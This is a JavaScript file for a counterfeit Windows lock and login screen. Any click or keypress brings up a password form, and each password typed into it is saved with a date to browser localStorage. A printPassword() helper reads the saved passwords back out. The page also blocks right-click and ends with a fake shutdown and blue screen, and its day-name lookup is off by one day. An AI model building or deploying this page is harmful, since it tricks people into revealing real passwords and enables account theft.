document.addEventListener("click", () => {
    if(document.getElementById("lock-screen").classList.contains("open")) {
        document.getElementById("lock-screen")?.classList.remove("open")
        document.getElementById("login-screen")?.classList.add("open")
        setTimeout(() => {
            document.getElementById("pass").focus()
        }, 200);
    }
})

document.addEventListener("keydown", (e) => {
    if(document.getElementById("lock-screen").classList.contains("open")) {
        document.getElementById("lock-screen")?.classList.remove("open")
        document.getElementById("login-screen")?.classList.add("open")
        setTimeout(() => {
            document.getElementById("pass").focus()
        }, 200);
    }
})

document.addEventListener("contextmenu", (e) => {
    e.preventDefault()
})

document.getElementById("form").addEventListener("submit", (e) => {
    e.preventDefault()
    const pass = document.getElementById("pass").value
    let allPasswords = JSON.parse(localStorage.getItem("passes")) || []

    allPasswords.push({
        password: pass,
        date: new Date()
    })

    localStorage.setItem("passes", JSON.stringify(allPasswords))

    document.getElementById("form").innerHTML = `
        <div class='loader'>
            <div class="bg"></div>
            <div class='circle'></div>
            <div class='circle'></div>
            <div class='circle'></div>
            <div class='circle'></div>
            <div class='circle'></div>
        </div>
    `

    setTimeout(() => {
        window.close()
    }, 2000)

})

function checkScreen() {
    if (window.innerHeight !== screen.height) {
        window.close()
        // if(window.opener !== null) {
        //     window.close()
        // } else {
        //     document.body.innerHTML = `
        //         <div class="death">
        //         </div>
        //     `
        // }
    }
    setTimeout(checkScreen, 10)
}

setTimeout(() => {
    // alert("Collatrel has started")
    // checkScreen()
}, 5000);

document.querySelectorAll(".shutdown").forEach((element) => {
    element.addEventListener("click", () => {
        console.log("Shutting down...")
        document.body.innerHTML = `
            <div class="shutdown-div">
                <div class="content">
                    <div class='loader shutdown-loader'>
                        <div class="bg"></div>
                        <div class='circle'></div>
                        <div class='circle'></div>
                        <div class='circle'></div>
                        <div class='circle'></div>
                        <div class='circle'></div>
                    </div>
                    <p>Please wait</p>
                </div>
            </div>
        `
        setTimeout(() => {
            document.body.innerHTML = `
                <div class="death">
                </div>
            `
            setTimeout(() => {
                document.body.innerHTML = `
                    <div class="blue-death">
                        <h1 class="sad-face">
                            :(
                        </h1>
                        <p>
                            Your PC ran into a problem and needs to restart. We're just collecting some error info, and then we'll restart for you.
                        </p>
                        <br/>
                        <p id="percentage">
                            0% complete
                        </p>
                        <br/>
                        <div class="inline" >
                            <img src="./imgs/qr.png" >
                            <p>
                                For more information about this issue and possible fixes, visit https://www.windows.com/stopcode
                            </p>
                        </div>
                    </div>
                `
                updatePercentage()
                function updatePercentage() {
                    var percentage = document.getElementById("percentage")
                    let currentPercentage = parseInt(percentage.innerHTML.split("%")[0])
                    console.log(currentPercentage)
                    let delay = Math.floor(Math.random() * 3000) + 2000
                    let increment = Math.floor(Math.random() * 5) + 4
                    let continueUpdate = true;
                    setTimeout(() => {
                        if(currentPercentage !== 99) {
                            if((currentPercentage + increment) >= 99) {
                                percentage.innerHTML = "99% complete"
                            } else {
                                percentage.innerHTML = `${currentPercentage + increment}% complete`
                                continueUpdate && updatePercentage()
                            }
                        }
                    }, delay)
                }
            }, 1500)
        }, 8000)
    })
})

updateTime()

function updateTime() {
    let timeEle = document.getElementById("time")
    let dateEle = document.getElementById("date")
    let time = new Date()
    let hours = time.getHours()
    let minutes = time.getMinutes()
    
    let date = time.getDate()
    let month = time.getMonth() + 1
    let year = time.getFullYear()
    let day = time.getDay()


    if(hours < 10) {
        hours = `0${hours}`
    } 
    
    if(minutes < 10) {
        minutes = `0${minutes}`
    } 

    dateEle.innerHTML = `${dayNumberToText(day)}, ${monthNumberToText(month)} ${date}`


    

    timeEle.innerHTML = `${hours}:${minutes}`

    setTimeout(updateTime, 10)
}

function monthNumberToText(num) {
    switch(num) {
        case 1:
            return "Jan"
        case 2:
            return "Feb"
        case 3:
            return "Mar"
        case 4:
            return "Apr"
        case 5:
            return "May"
        case 6:
            return "Jun"
        case 7:
            return "Jul"
        case 8:
            return "Aug"
        case 9:
            return "Sep"
        case 10:
            return "Oct"
        case 11:
            return "Nov"
        case 12:
            return "Dec"
    }
}

function dayNumberToText(num) {
    switch(num) {
        case 0:
            return "Monday"
        case 1:
            return "Tuesday"
        case 2:
            return "Wednesday"
        case 3:
            return "Thursday"
        case 4:
            return "Friday"
        case 5:
            return "Saturday"
        case 6:
            return "Sunday"
    }
}

randomizeWifiSignal()

function randomizeWifiSignal() {
    let lockScreenWiFi = document.getElementById("lock-wifi")
    let loginScreenWiFi = document.getElementById("login-wifi")
    let signal = Math.floor(Math.random() * 2) + 1
    let noSignal = Math.floor(Math.random() * 20) + 1
    if(noSignal === 1) {
        signal = "Error"
    }

    lockScreenWiFi.innerHTML = `<img src="./imgs/options/wifi/wifi${signal}.png" alt="">`
    loginScreenWiFi.innerHTML = `<img src="./imgs/options/wifi/wifi${signal}.png" alt="">`
    setTimeout(() => {
        randomizeWifiSignal()
    }, 3500);
}

function printPassword() {
    let passwords = JSON.parse(localStorage.getItem("passes"))
    console.log(passwords)
}